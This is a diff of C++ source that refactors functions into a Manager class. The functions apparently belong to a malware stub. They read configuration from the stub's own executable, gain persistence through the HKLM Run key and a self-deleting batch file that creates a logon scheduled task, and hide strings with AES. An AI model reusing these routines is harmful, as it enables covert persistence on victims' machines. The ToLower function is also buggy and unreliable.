@@ -25,7 +25,7 @@ SOFTWARE.
 #include "Manager.h"
 #include "Requests.h"
 
-void ReadData(Settings* s) {
+void Manager::ReadData(Settings* s) {
 	char mePath[128] = { 0 };
 	GetModuleFileNameA(NULL, mePath, sizeof(mePath) - 1);
 
@@ -54,7 +54,7 @@ void ReadData(Settings* s) {
 	stub.close();
 }
 
-void Autorun(const char* path, const char* name) {
+void Manager::Autorun(const char* path, const char* name) {
 	HKEY reg_key = 0;
 	const char* address = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
 	LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, address, 0, KEY_ALL_ACCESS, &reg_key);
@@ -64,7 +64,7 @@ void Autorun(const char* path, const char* name) {
 	RegCloseKey(reg_key);
 }
 
-void Scheduler(const char* path, const char* name) {
+void Manager::Scheduler(const char* path, const char* name) {
 	std::ofstream schd("scheduler.bat");
 	schd << "@echo off \n";
 	schd << "SCHTASKS /CREATE /SC ONLOGON /TN \"" + std::string(name) + "\" /TR \"" + std::string(path);
@@ -75,18 +75,18 @@ void Scheduler(const char* path, const char* name) {
 	DeleteFileA("scheduler.bat");
 }
 
-long GetFileSize(const char* filename) {	
+long Manager::GetFileSize(const char* filename) {
 	struct stat stat_buf;
 	int rc = stat(filename, &stat_buf);
 	return rc == 0 ? stat_buf.st_size : -1;
 }
 
-bool FileExists(std::string name) {
+bool Manager::FileExists(std::string name) {
 	struct stat buffer;
 	return (stat(name.c_str(), &buffer) == 0);
 }
 
-std::string EncryptStr(std::string text, std::string key) {
+std::string Manager::EncryptStr(std::string text, std::string key) {
 	byte bKey[CryptoPP::AES::DEFAULT_KEYLENGTH], iv[CryptoPP::AES::BLOCKSIZE];
 	memcpy(bKey, key.c_str(), CryptoPP::AES::DEFAULT_KEYLENGTH);
 	memset(iv, 0x00, CryptoPP::AES::BLOCKSIZE);
@@ -103,7 +103,7 @@ std::string EncryptStr(std::string text, std::string key) {
 	return result;
 }
 
-std::string DecryptStr(std::string text, std::string key) {
+std::string Manager::DecryptStr(std::string text, std::string key) {
 	byte bKey[CryptoPP::AES::DEFAULT_KEYLENGTH], iv[CryptoPP::AES::BLOCKSIZE];
 	memcpy(bKey, key.c_str(), CryptoPP::AES::DEFAULT_KEYLENGTH);
 	memset(iv, 0x00, CryptoPP::AES::BLOCKSIZE);
@@ -120,7 +120,7 @@ std::string DecryptStr(std::string text, std::string key) {
 	return result;
 }
 
-std::vector<std::string> split(std::string str, char delim) {
+std::vector<std::string> Manager::split(std::string str, char delim) {
 	std::stringstream ss(str);
 	std::string word;
 	std::vector<std::string> splittened;
@@ -131,7 +131,7 @@ std::vector<std::string> split(std::string str, char delim) {
 	return splittened;
 }
 
-std::string ToLower(std::string str) {
+std::string Manager::ToLower(std::string str) {
 	std::string lower = "";
 	std::transform(str.begin(), str.end(), lower.begin(), ::tolower);
 	return lower;
